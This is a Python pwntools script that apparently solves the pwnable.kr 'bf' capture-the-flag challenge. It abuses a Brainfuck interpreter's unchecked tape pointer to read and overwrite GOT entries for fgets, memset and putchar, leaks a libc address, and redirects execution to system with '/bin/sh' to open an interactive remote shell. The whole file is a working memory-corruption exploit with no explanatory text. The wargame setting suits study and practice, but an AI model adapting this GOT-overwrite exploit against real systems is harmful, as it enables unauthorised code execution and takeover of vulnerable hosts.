from pwn import *

p = 0x804a0a0

def retaddr():
	return "<"*3

def readaddr():
	return ".>.>.>."

def writeaddr():
	return ",>,>,>,"

def solver():
	fd = remote("pwnable.kr", 9001)
	
	elf = ELF("./bf_libc.so")

	fgets = 0x804A010
	memset = 0x804A02C
	putchar = 0x804A030
	main = 0x8048671

	pause()
	fd.recv()

	pay = ("<" * (p - fgets) + readaddr() + retaddr() + writeaddr() + retaddr())
	pay += (">" * (memset - fgets) + readaddr() + retaddr() + writeaddr() + retaddr())
	pay += (">" * (putchar - memset) + readaddr() + retaddr() + writeaddr() + retaddr())
	pay += (".")
	fd.sendline(pay)

	fgets_got = u32(fd.recvn(4)[:4])

	libc_base = fgets_got - elf.symbols['fgets']
	gets = libc_base + elf.symbols['gets']
	system = libc_base + elf.symbols['system']
	
	fd.send(p32(system))
	fd.send(p32(gets))
	fd.send(p32(main))
	fd.sendline("/bin/sh")
	fd.interactive()


if __name__ == "__main__":
	solver()
